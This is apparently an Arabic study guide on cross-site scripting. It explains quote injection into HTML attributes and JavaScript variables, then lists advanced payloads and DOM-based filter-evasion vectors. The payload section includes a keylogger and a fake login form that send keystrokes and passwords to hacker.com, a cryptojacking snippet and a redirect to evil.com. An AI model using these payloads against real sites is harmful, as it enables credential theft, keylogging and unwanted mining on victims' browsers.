

## **حقن علامات الاقتباس لاستغلال XSS**
{  #Inline_HTML_Injection  }
#### **النص المرتبط**
> In those cases, you might be able to submit single or double quotes to inject an XSS payload.

#### **الشرح التفصيلي**
- **مفهوم حقن علامات الاقتباس**:
  - علامات الاقتباس الفردية (`'`) والمزدوجة (`"`) تُستخدم في HTML وJavaScript لتحديد قيم السمات (مثل `value="something"`) أو المتغيرات (مثل `var name = 'something';`). إذا سمح الموقع بإدخال هذه الأحرف دون تنظيف (أي دون تحويلها إلى HTML entities مثل `&quot;` أو `&#39;`), يمكن استخدامها لتغيير بنية الكود.
  - **الهدف**: إغلاق قيمة سمة أو متغير موجود مبكرًا، ثم إضافة كود JavaScript ضار.

- **كيف يعمل هذا؟**:
  - في HTML، تُستخدم علامات الاقتباس لتحديد قيم السمات. إذا أدخلت `"` في سمة مثل `value="..."`, يمكنك إغلاق السمة وإضافة سمة جديدة تحتوي على JavaScript.
  - في JavaScript، تُستخدم علامات الاقتباس لتحديد النصوص. إذا أدخلت `'`, يمكنك إغلاق النص وإضافة أوامر JavaScript جديدة.

- **مصطلحات رئيسية**:
  - **Single or double quotes**: `'` أو `"`، وهي أحرف تُستخدم لتحديد النصوص في الكود.
  - **XSS payload**: كود JavaScript ضار يهدف إلى تنفيذ إجراءات مثل عرض نافذة منبثقة (`alert`), سرقة ملفات تعريف الارتباط (`document.cookie`), أو إعادة توجيه المستخدم إلى موقع ضار.

- **مثال عملي**:
  - لنفترض أن لديك حقل إدخال في نموذج، والموقع يعرض إدخالك في سمة HTML:
    ```html
    <input type="text" value="YOUR_INPUT">
    ```
  - إذا أدخلت: `" onmouseover=alert('XSS') "`
  - الكود الناتج:
    ```html
    <input type="text" value="" onmouseover=alert('XSS') "">
    ```
  - عندما يمرر المستخدم مؤشر الفأرة فوق الحقل، تظهر نافذة منبثقة تقول "XSS".

- **لماذا هذا مهم؟**:
  - علامات الاقتباس أقل عرضة للتصفية مقارنة بعلامات HTML، مما يجعلها نقطة ضعف شائعة في المواقع التي تحمي ضد `<script>` ولكن تهمل تنظيف `'` أو `"`.
  - هذه الطريقة تتيح استغلال XSS في سياقات لا تسمح بإدخال علامات HTML مباشرة.

---


## ** حقن XSS في سمات HTML (مثل `<input>`)**  
{ #XSS--ALL--Event--Payload / #XSS_unique_tags  }
#### **النص المرتبط**
> For example, let’s say you can access the following code’s value attribute: `<input type="text" name="username" value="hacker" width=50px>`  
> By injecting a double quote in the value attribute, you could close the existing quote and inject a malicious XSS payload into the tag.  
> You might do this by changing the value attribute to `hacker" onfocus=alert(document.cookie) autofocus "`, which would result in the following: `<input type="text" name="username" value="hacker" onfocus=alert(document.cookie) autofocus "" width=50px>`  
> When the payload runs, it would alert on `document.cookie`.

#### **الشرح التفصيلي**
- **مفهوم الحقن في سمات HTML**:
  - يتمثل الهدف في التحكم في قيمة سمة HTML (مثل `value` في `<input>`) واستخدام علامات الاقتباس لتغيير بنية العلامة، مما يسمح بإضافة سمات JavaScript مثل `onfocus` أو `onmouseover`.
  - **السيناريو**: لنفترض أنك تُدخل نصًا في حقل اسم مستخدم، ويتم عرضه في صفحة لاحقة داخل `<input value="YOUR_INPUT">`. إذا كنت تستطيع إدخال `"`, يمكنك إغلاق السمة وإضافة كود جديد.

- **تفاصيل الكود الأصلي**:
  - `<input type="text" name="username" value="hacker" width=50px>`:
    - **type="text"**: حقل إدخال نصي.
    - **name="username"**: اسم الحقل لتحديد البيانات عند إرسال النموذج.
    - **value="hacker"**: القيمة التي أدخلها المستخدم (في هذه الحالة، "hacker").
    - **width=50px**: عرض الحقل (ملاحظة: هذه السمة غير قياسية في HTML5، لكنها قد تُستخدم).

- **كيفية الحقن**:
  - **الإدخال**: بدلاً من إدخال "hacker"، تُدخل: `hacker" onfocus=alert(document.cookie) autofocus "`.
  - **تحليل الإدخال**:
    - **hacker"**: النص الأصلي مع إغلاق مبكر للسمة باستخدام `"`.
    - **onfocus=alert(document.cookie)**: سمة HTML تُنفذ `alert(document.cookie)` عند تحديد الحقل (عند النقر أو باستخدام `autofocus`).
    - **autofocus**: سمة تجعل الحقل محددًا تلقائيًا عند تحميل الصفحة.
    - **"**: إغلاق السمة `value` بشكل صحيح لتجنب أخطاء نحوية.

- **الكود الناتج**:
  - `<input type="text" name="username" value="hacker" onfocus=alert(document.cookie) autofocus "" width=50px>`
  - **تحليل الكود**:
    - **value="hacker"**: القيمة الأصلية.
    - **onfocus=alert(document.cookie)**: سمة جديدة تُنفذ JavaScript.
    - **autofocus**: يضمن تنفيذ `onfocus` فور تحميل الصفحة.
    - **""**: قيمة فارغة ناتجة عن علامة الاقتباس الإضافية (غير ضارة).

- **كيف يتم التنفيذ؟**:
  - عند تحميل الصفحة، يضع المتصفح التركيز على الحقل بسبب `autofocus`.
  - هذا يُطلق حدث `onfocus`، الذي ينفذ `alert(document.cookie)`، مما يُظهر نافذة منبثقة تحتوي على ملفات الارتباط (مثل `session=abc123`).

- **مثال عملي**:
  - تخيل أنك في موقع تسجيل دخول، وأدخلت في حقل الاسم: `hacker" onfocus=alert(document.cookie) autofocus "`.
  - عند إعادة تحميل الصفحة، يظهر الحقل مع المؤشر داخله، وتظهر نافذة منبثقة تعرض ملفات الارتباط. إذا كانت ملفات الارتباط تحتوي على معرف جلسة، يمكن للمهاجم استخدامه للوصول إلى حسابك.

- **لماذا هذا مهم؟**:
  - هذه الطريقة فعالة في المواقع التي تسمح بإدخال علامات الاقتباس ولكن تمنع علامات HTML.
  - استخدام `autofocus` يجعل الهجوم تلقائيًا، مما يزيد من خطورته.

---

## ** قيود استخدام `autofocus` و`onfocus`**
{   #XSS--ALL--Event--Payload }

#### **النص المرتبط**
> The `autofocus` attribute instructs the browser to place the cursor focus on the input text box as soon as the page loads.  
> The `onfocus` JavaScript attribute tells the browser to execute JavaScript when the input text box is the focus (without `autofocus`, the `onfocus` would occur when a person clicks the text box).  
> But these two attributes have limits: you can’t `autofocus` on a hidden field.  
> Also, if multiple fields are on a page with `autofocus`, either the first or last element will be the focus depending on the browser.

#### **الشرح التفصيلي**
- **مفهوم `autofocus` و`onfocus`**:
  - **autofocus**: سمة HTML تُضاف إلى عناصر النموذج (مثل `<input>` أو `<textarea>`) لجعلها محددة تلقائيًا عند تحميل الصفحة. عندما يصبح الحقل محددًا، يظهر المؤشر داخله، ويصبح جاهزًا للكتابة.
  - **onfocus**: سمة HTML ترتبط بحدث (event) يُطلق عندما يصبح العنصر محددًا (إما بالنقر عليه أو باستخدام `autofocus`). يمكن استخدامها لتنفيذ JavaScript، مثل `alert(document.cookie)`.

- **كيف يعملان معًا؟**:
  - بدون `autofocus`, يجب على المستخدم النقر على الحقل يدويًا لتشغيل `onfocus`.
  - مع `autofocus`, يتم تحديد الحقل تلقائيًا، مما يُطلق `onfocus` فور تحميل الصفحة، مما يجعل الهجوم أكثر فعالية لأنه لا يتطلب تفاعل المستخدم.

- **القيود**:
  - **لا يمكن استخدام `autofocus` على الحقول المخفية**:
    - الحقول المخفية (مثل `<input type="hidden">`) تُستخدم لتخزين بيانات دون عرضها للمستخدم. بما أنها غير مرئية، لا يمكن تحديدها تلقائيًا، مما يعني أن `autofocus` لن يعمل.
    - **مثال**: `<input type="hidden" onfocus=alert('XSS') autofocus>` لن يُنفذ `alert('XSS')` لأن الحقل لا يمكن تحديده.
  - **تعدد الحقول مع `autofocus`**:
    - إذا كانت الصفحة تحتوي على عدة حقول مع `autofocus` (مثل `<input autofocus>` و`<textarea autofocus>`), فإن المتصفح يختار حقلًا واحدًا فقط:
      - بعض المتصفحات (مثل Chrome) تختار **أول** حقل.
      - متصفحات أخرى قد تختار **آخر** حقل.
    - هذا قد يؤدي إلى عدم تحديد الحقل الذي تحاول استغلاله، مما يقلل من نجاح الهجوم.
    - **مثال**:
      ```html
      <input autofocus onfocus=alert('Field 1')>
      <input autofocus onfocus=alert('Field 2')>
      ```
      في Chrome، قد يتم تحديد الحقل الأول وتظهر "Field 1". في متصفح آخر، قد تظهر "Field 2".

- **مثال عملي**:
  - إذا كنت تستغل حقل `<input>` مع `autofocus` و`onfocus`, لكن الصفحة تحتوي على حقل آخر مع `autofocus`, فقد يتم تحديد الحقل الآخر، مما يمنع تنفيذ كودك.
  - إذا كان الحقل مخفيًا (مثل `<input type="hidden">`), فلن يعمل `autofocus`, وستحتاج إلى الاعتماد على تفاعل المستخدم (مثل النقر).

- **لماذا هذا مهم؟**:
  - فهم هذه القيود يساعد في اختيار السياق المناسب للحقن. إذا كان الحقل مخفيًا أو هناك حقول متعددة مع `autofocus`, قد تحتاج إلى تجربة سمات أخرى (مثل `onmouseover`) أو سياقات مختلفة.

---

##  حقن XSS في متغيرات JavaScript داخل `<script>`**
{ #XSS_Idea_for_script_tag }

#### **النص المرتبط**
> Similarly, let’s say you had access to a variable within a `<script>` tag.  
> If you could inject single quotes into the value for the `name` variable in the following code, you could close the variable and execute your own JavaScript: `<script> var name = 'hacker'; </script>`  
> Because we control the value `hacker`, changing the `name` variable to `hacker';alert(document.cookie);'` would result in the following: `<script> var name = 'hacker';alert(document.cookie);''; </script>`  
> When the payload runs, it would `alert` on `document.cookie`.

#### **الشرح التفصيلي**
- **مفهوم الحقن في متغيرات JavaScript**:
  - يتمثل الهدف في التحكم في قيمة متغير JavaScript داخل علامة `<script>` واستخدام علامات الاقتباس الفردية (`'`) لإغلاق المتغير مبكرًا، ثم إضافة كود JavaScript ضار.
  - **السيناريو**: لنفترض أن الموقع يأخذ إدخال المستخدم (مثل اسم مستخدم) ويضعه في متغير JavaScript:
    ```html
    <script>
    var name = 'YOUR_INPUT';
    </script>
    ```

- **تفاصيل الكود الأصلي**:
  - `<script> var name = 'hacker'; </script>`:
    - **var name**: تعريف متغير JavaScript يُسمى `name`.
    - **'hacker'**: القيمة التي أدخلها المستخدم (في هذه الحالة، "hacker").
    - **;**: فاصلة نقطية تُنهي تعريف المتغير.

- **كيفية الحقن**:
  - **الإدخال**: بدلاً من إدخال "hacker"، تُدخل: `hacker';alert(document.cookie);'`.
  - **تحليل الإدخال**:
    - **hacker'**: النص الأصلي مع إغلاق مبكر باستخدام `'`.
    - **;**: فاصلة نقطية تُنهي تعريف المتغير `name`.
    - **alert(document.cookie)**: دالة JavaScript تُظهر ملفات الارتباط.
    - **;'**: إغلاق الكود الجديد وإضافة علامة اقتباس إضافية لتجنب أخطاء نحوية.

- **الكود الناتج**:
  - `<script> var name = 'hacker';alert(document.cookie);''; </script>`
  - **تحليل الكود**:
    - **var name = 'hacker';**: تعريف المتغير كما هو.
    - **alert(document.cookie);**: تنفيذ دالة `alert` لعرض ملفات الارتباط.
    - **'';**: نص فارغ ناتج عن علامة الاقتباس الإضافية (غير ضار).

- **كيف يتم التنفيذ؟**:
  - عند تحميل الصفحة، ينفذ المتصفح الكود داخل `<script>`.
  - يتم تعريف `name = 'hacker'`.
  - ثم يتم تنفيذ `alert(document.cookie)`، مما يُظهر نافذة منبثقة تحتوي على ملفات الارتباط.
  - النص الفارغ `'';` لا يؤثر على التنفيذ.

- **مثال عملي**:
  - تخيل أنك في موقع يطلب منك إدخال اسمك، ويستخدم الإدخال في JavaScript:
    ```html
    <script>
    var name = 'YOUR_INPUT';
    </script>
    ```
  - تُدخل: `hacker';alert('XSS');'`
  - الكود الناتج:
    ```html
    <script>
    var name = 'hacker';alert('XSS');'';
    </script>
    ```
  - عند تحميل الصفحة، تظهر نافذة منبثقة تقول "XSS".

- **لماذا هذا مهم؟**:
  - الحقن داخل `<script>` أكثر خطورة لأنه يتم تنفيذه تلقائيًا عند تحميل الصفحة، دون الحاجة إلى تفاعل المستخدم.
  - هذه الطريقة فعالة في المواقع التي تُدخل بيانات المستخدم مباشرة في JavaScript دون تنظيف.

---

## ** أهمية الصحة النحوية للكود (Syntax Correctness)**
{ #XSS_other_idea / #Inline_HTML_Injection   }

#### **النص المرتبط**
> Injecting a single quote and semicolon closes the variable `name`.  
> Because we’re using a `<script>` tag, the JavaScript function `alert(document.cookie)`, which we also injected, will execute.  
> We add an additional `;'` to end our function call and ensure the JavaScript is syntactically correct because the site includes a `';` to close the `name` variable.  
> Without the `';` syntax at the end, there would be a dangling single quote, which could break the page syntax.

#### **الشرح التفصيلي**
- **مفهوم الصحة النحوية**:
  - الكود الذي تُدخله يجب أن يكون خاليًا من الأخطاء النحوية (syntactically correct) ليتم تنفيذه بواسطة المتصفح. إذا كان الكود يحتوي على أخطاء (مثل علامة اقتباس غير مغلقة)، فقد يتوقف JavaScript عن العمل، أو قد تتوقف الصفحة بأكملها.
  - في سياق الحقن في متغيرات JavaScript، تحتاج إلى التأكد من أن الكود الجديد يتماشى مع بنية الكود الأصلي.

- **دور علامات الاقتباس والفواصل النقطية**:
  - **Single quote and semicolon**: استخدام `'` لإغلاق النص و`;` لإنهاء تعريف المتغير يضمن أن المتصفح يرى المتغير مغلقًا بشكل صحيح.
  - **Additional `;'`**: إضافة `;'` بعد الكود الجديد (مثل `alert(document.cookie)`) لإنهاء الأمر وتجنب الأخطاء النحوية.
  - **Site includes a `';`**: الموقع يضيف `';` في نهاية تعريف المتغير الأصلي (مثل `var name = 'hacker';`). لذلك، تحتاج إلى التأكد من أن الكود الجديد يأخذ هذا في الاعتبار.

- **ماذا يحدث بدون الصحة النحوية؟**:
  - **Dangling single quote**: علامة اقتباس فردية (`'`) بدون إغلاق تتسبب في خطأ نحوي، مما يمنع تنفيذ الكود.
  - **Break the page syntax**: إذا كان الكود غير صحيح، قد يتوقف JavaScript عن العمل، أو قد تظهر الصفحة بشكل غير صحيح، مما قد يلفت انتباه الموقع إلى الثغرة.

- **مثال عملي**:
  - **إدخال غير صحيح**:
    - إدخال: `hacker';alert('XSS')`
    - الكود الناتج: `<script> var name = 'hacker';alert('XSS')'; </script>`
    - المشكلة: علامة الاقتباس الزائدة `'` تتسبب في خطأ نحوي:
      ```javascript
      var name = 'hacker';alert('XSS')';
      ```
      المتصفح لن يفهم `'` الزائدة، وسيتوقف التنفيذ.
  - **إدخال صحيح**:
    - إدخال: `hacker';alert('XSS');'`
    - الكود الناتج: `<script> var name = 'hacker';alert('XSS');''; </script>`
    - هذا يعمل لأن:
      - `;` تُنهي تعريف `name`.
      - `alert('XSS');` هو أمر مستقل.
      - `'';` هو نص فارغ لا يؤثر على التنفيذ.

- **لماذا هذا مهم؟**:
  - الصحة النحوية تضمن أن الكود يُنفذ كما هو متوقع دون لفت الانتباه إلى الثغرة.
  - إذا تسبب الحقن في كسر الصفحة، قد يلاحظ الموقع المشكلة ويصلح الثغرة قبل استغلالها.

---

### **ملخص المواضيع**
1. **حدود استخدام علامات HTML**: المواقع غالبًا تمنع إدخال `<script>`, مما يتطلب بدائل مثل علامات الاقتباس.
2. **حقن علامات الاقتباس**: استخدام `'` أو `"` لتغيير بنية الكود وإدخال JavaScript.
3. **تأثير الحقن**: يعتمد على السياق (HTML، JavaScript، أو نص عادي). الحقن في `<script>` أكثر خطورة.
4. **حقن في سمات HTML**: استغلال `value` في `<input>` باستخدام `onfocus` و`autofocus` لتنفيذ كود تلقائي.
5. **قيود `autofocus` و`onfocus`**: لا يعملان على الحقول المخفية، وقد يتأثران بوجود حقول متعددة مع `autofocus`.
6. **حقن في متغيرات JavaScript**: إغلاق المتغير باستخدام `'` و`;` لإضافة كود جديد يُنفذ تلقائيًا.
7. **الصحة النحوية**: الكود يجب أن يكون خاليًا من الأخطاء ليعمل، وإلا قد يتوقف التنفيذ أو يكتشف الموقع الثغرة.

---

### **أمثلة إضافية لتوضيح المواضيع**
1. **حقن في سمة أخرى**:
   - إدخال: `hacker" onmouseover=alert('XSS') "`
   - الكود: `<input value="hacker" onmouseover=alert('XSS') "">`
   - التنفيذ: عند تمرير الفأرة فوق الحقل، تظهر نافذة منبثقة تقول "XSS".
2. **حقن في JavaScript مع إعادة توجيه**:
   - إدخال: `hacker';document.location='http://evil.com';'`
   - الكود: `<script> var name = 'hacker';document.location='http://evil.com';''; </script>`
   - التنفيذ: يُعاد توجيه المستخدم إلى موقع ضار.
3. **حقن غير ناجح بسبب التصفية**:
   - إدخال: `hacker" onfocus=alert('XSS') "`
   - إذا قام الموقع بتحويل `"` إلى `&quot;`, الكود الناتج:
     ```html
     <input value="hacker&quot; onfocus=alert('XSS') &quot;">
     ```
     هذا لن يعمل لأن `"` لم تُغلق السمة.

---


## **Advanced XSS Payloads**
{  #XSS_Idea_for_script_tag  / #XSS_other_idea}
#### **1. Keylogging**

```html
<script>  
  document.addEventListener('keypress', (e) => {  
    fetch('https://hacker.com/log?key=' + e.key);  
  });  
</script>  
```

- Logs every keystroke and sends it to the hacker.

#### **2. Phishing**

```html
<script>  
  document.body.innerHTML = `  
    <form action="https://hacker.com/steal" method="POST">  
      <input type="password" name="password" placeholder="Enter password">  
      <button>Submit</button>  
    </form>  
  `;  
</script>  
```

- Replaces the page with a fake login form.

#### **3. Cryptojacking**

```html
<script src="https://coinhive.com/lib/miner.js"></script>  
<script>  
  const miner = new CoinHive.Anonymous('YOUR_MONERO_ADDRESS');  
  miner.start();  
</script>  
```

## الموقع مع تنبيه أولي (Location with Leading Alert)

{   #ideas_for_url / #XSS_DOM  }
##### **الشرح البسيط:**
تُستخدم لتكوين `javascript:alert(1)` عبر خصائص DOM مثل `innerHTML` أو `previousSibling.nodeValue` مع إضافة تنبيه أولي لتضليل المرشحات.

##### **الأكواد:**
```
`-alert(1)<javascript:`/onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
`-alert(1)<javas/onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
<alert(1)<!--/onmouseover=location=innerHTML+outerHTML>javascript:1/*hoverme!*/</alert(1)<!-->
<j/1="*/""-alert(1)<!--/onmouseover=location=innerHTML+outerHTML>javascript:/*hoverme!
*/"<j/1=/alert(1)//onmouseover=location=innerHTML+previousSibling.nodeValue+outerHTML>javascript:/*hoverme!
```

##### **لماذا يعمل؟**
- تستخدم خصائص DOM لتكوين `javascript:alert(1)`.
- التعليقات (`<!-- -->`) والعلامات المخصصة تُعقد الكشف.
- يتطلب تفاعل (`onmouseover`).

##### 🔎 **الفكرة:**

- نستغل عناصر HTML + خصائص DOM (زي `tagName`, `previousSibling.nodeValue`) لتكوين سلسلة `javascript:alert(1)`.
    
- يتم التنفيذ عند حدث مثل `onmouseover`.
    

##### 🔧 **شرح عملي:**

- تخيل الكود التالي داخل موقع:
    
    ```html
    <div onmouseover="location=this.tagName + this.previousSibling.nodeValue">hoverme!</div>
    ```
    
##### - إذا كانت القيمة السابقة للعنصر هي:
    
    ```
    `-alert(1)<javascript:
    ```
    
- يصبح ناتج `location = tagName + previousSibling.nodeValue = "DIV" + "`-alert(1)<javascript:"`
    
- النتيجة النهائية: `location="DIV`-alert(1)<javascript:"`→ ينفذ الكود لأن`<javascript:` يتم تفسيرها كبروتوكول مخصص للسكربت.
    

##### 🎯 **نقطة الكشف:**

- ابحث في الكود عن:  
    `location = ... tagName`, `previousSibling.nodeValue`, أو أي خصائص DOM مرتبطة بسياق URL.
    

##### **الخلاصة:**
ناقلات الموقع مع تنبيه أولي فعالة لأنها تُشكل XSS معقد باستخدام DOM وتتجاوز المرشحات.

---

##  الموقع مع URL الذاتي (Location with Self URL)

{   #ideas_for_url / #XSS_DOM  }

#### **الشرح البسيط:**
تستغل انعكاس معلمة URL ضعيفة (`[P]`) لتكوين `javascript:alert(1)` عبر `location`.

#### **الأكواد:**
```
<svg id=?[P]=<svg/onload=alert(1)+ onload=location=id>
<j/onmouseover=location=textContent>?[P]=<svg/onload=alert(1)>hoverme!</j>
<j/onmouseover=location+=textContent>&[P]=<svg/onload=alert(1)>hoverme!</j>
<j&[P]=<svg+onload=alert(1)/onmouseover=location+=outerHTML>hoverme!</j&[P]=<svg+onload=alert(1)>
&[P]=<svg/onload=alert(1)><j/onmouseover=location+=document.body.textContent>hoverme!</j>
```

#### **ملاحظة:**
- استبدل `[P]` بالمعلمة الضعيفة.
- رمز `&` إلى `%26` في URLs.
- الناقل الأخير خاص بـ Firefox.

#### **لماذا يعمل؟**
- تستغل انعكاس المعلمة لإدراج `<svg onload=alert(1)>`.
- `textContent` و`outerHTML` يُكملان الحمولة.

#### 🔎 **الفكرة:**

- استخدام معلمة في URL يتم عكسها بدون تنظيف.
    
- نجعل السكربت يقرأ موقعه الذاتي (`location`) لتكوين XSS داخلي ذاتي التنفيذ.
    

#### 🔧 **مثال عملي:**

- URL:
    
    ```
    https://site.com/page?[P]=<svg/onload=alert(1)>
    ```
    
- والصفحة فيها كود:
    
    ```html
    <div onmouseover="location+=this.textContent">hoverme!</div>
    ```
    
- يتم عكس `<svg/onload=alert(1)>` داخل الصفحة.
    

#### 📌 **تفصيل DOM:**

- عند تمرير `[P]=<svg/onload=alert(1)>` تصبح `textContent = <svg/onload=alert(1)>`
    
- ثم: `location += textContent → javascript:<svg/onload=alert(1)>` ⇒ يتم التنفيذ عند التفاعل.
    

#### 🎯 **نقطة الكشف:**

- افحص المعلمات المنعكسة في الصفحة.
    
- جرّب إدخال SVG مرفقة بـ onload.
    
- راقب رد فعل DOM عند hover أو أي event handler.
    

#### **الخلاصة:**
ناقلات الموقع مع URL ذاتي فعالة لأنها تستخدم معلمات URL لتكوين XSS.

---

##  الموقع مع القالب الحرفي (Location with Template Literal)
{   #ideas_for_url / #XSS_DOM  }
#### **الشرح البسيط:**
تستخدم قوالب JavaScript الحرفية (`${alert(1)}`) لتكوين `javascript:alert(1)` عبر `location`.

#### **الأكواد:**
```
${alert(1)}<javascript:`//onmouseover=location=tagName+URL>hoverme!
${alert(1)}<j/onmouseover=location=innerHTML+URL>javascript:`//hoverme!
${alert(1)}<javas/onmouseover=location=tagName+innerHTML+URL>cript:`//hoverme!
${alert(1)}`<javascript:`//onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
${alert(1)}`<javas/onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
```

#### **لماذا يعمل؟**
- `${alert(1)}` يُدرج كجزء من القالب.
- `tagName` و`innerHTML` يكملان الحمولة.
- يتجاوز مرشحات القوالب الحرفية.

#### 🔎 **الفكرة:**

- استخدام قوالب جافاسكريبت `template literals` والتي تبدأ بـ `${}` لتضمين تنفيذ مباشر لكود JS.
    

#### 🔧 **مثال عملي:**

```html
<div onmouseover="location=`${alert(1)}<javascript:`">hoverme!</div>
```

#### 🔍 **ماذا يحدث؟**

- `${alert(1)}` يتم تنفيذه مباشرة داخل القالب.
    
- ثم يتم دمجه مع النص التالي ليكون `location = javascript:`.
    
- المتصفح يتبع الرابط وينفذ السكربت.
    

#### 🎯 **نقطة الكشف:**

- فتش عن أكواد فيها:
    
    ```js
    location = `...`
    ```
    
    أو حتى:
    
    ```js
    let url = `${some_var}`
    location = url;
    ```
    
- حاول حقن داخل `${}` باستخدام أدوات مثل Burp أو اليدوي.
   
#### **الخلاصة:**
ناقلات القالب الحرفي فعالة لأنها تستخدم قوالب JavaScript لتضليل المرشحات.

---

##  بديل خصائص Inner & Outer HTML (Inner & Outer HTML Properties Alternative)
{  #ideas_for_url /  #XSS_DOM /  #XSS_Idea_for_SVG_tag  }

#### **الشرح البسيط:**
تُستخدم `innerHTML` و`outerHTML` لإدراج HTML يحتوي على XSS بدلاً من `location`.

#### **الأكواد:**
```
<svg id=<img/src/onerror=alert(1)> onload=head.innerHTML=id>
<svg id=<img/src/onerror=alert(1)> onload=body.outerHTML=id>
```

#### **لماذا يعمل؟**
- تُدرج `<img>` مع `onerror=alert(1)` عبر DOM.
- يمكن استخدام عناصر مثل `all[0]` بدلاً من `head` أو `body`.
- يتجاوز مرشحات `location`.

#### 🔎 **الفكرة:**

- بعض الفلاتر تمنع `location=...` أو `href=...` لكن لا تمنع DOM-based حقن باستخدام `innerHTML` أو `outerHTML`.
    

#### 🔧 **مثال عملي:**

```html
<svg id='<img src=x onerror=alert(1)>' onload='document.body.innerHTML = this.id'></svg>
```

#### 📌 **تفصيل ما يحدث:**

- `id` يحتوي على سكربت جاهز (`<img src=x onerror=alert(1)>`)
    
- عند onload: يتم وضع `this.id` كـ `innerHTML` للـ `body`.
    
- أي يتم إدراج العنصر الضار داخل الصفحة → يتم التنفيذ فورًا.
    

#### 🎯 **نقطة الكشف:**

- ابحث عن استخدام:
    
    - `element.innerHTML =`
        
    - `document.body.outerHTML =`
        
    - `document.all[0].innerHTML =`
        
- جرّب حقن `<img src=x onerror=alert(1)>` داخل أي قيمة `id` أو `name` أو غيرها.
    

#### **الخلاصة:**
بديل `innerHTML` و`outerHTML` فعال لأنه يُنفذ XSS عبر DOM مباشرة.

-----
